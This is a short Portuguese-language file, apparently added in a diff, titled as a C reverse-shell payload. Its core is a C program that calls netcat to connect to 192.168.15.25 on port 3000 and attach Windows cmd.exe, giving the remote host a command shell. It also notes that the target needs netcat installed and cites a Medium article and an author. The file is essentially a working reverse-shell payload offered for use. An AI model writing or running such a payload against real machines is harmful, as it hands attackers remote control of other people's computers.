@@ -1,0 +1,45 @@
+                       PAYLOAD EM C
+
+
+
+                       REVERSE SHELL
+
+
+
+REVERSESHELL
+===========================================================
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+  system("nc 192.168.15.25 3000 -e C:\\Windows\\system32\\cmd.exe");
+  return 0;
+}
+===========================================================
+
+
+
+
+
+
+    OBS:
+         Para funcionar o cliente precisa ter
+         o netcat instalado.
+
+    __________________________________________________
+    REFERÊNCIAS BIBLIOGRÁFICAS:
+    https://medium.com/@pedr0ni/reverse-shell-com-netcat-2fe833d2b4e7
+
+
+
+
+
+
+
+    __________________________________________________
+
+
+                       Autor:
+                 Cristiano Oliveira
+                 britonano@gmail.com
+                     21/03/2022
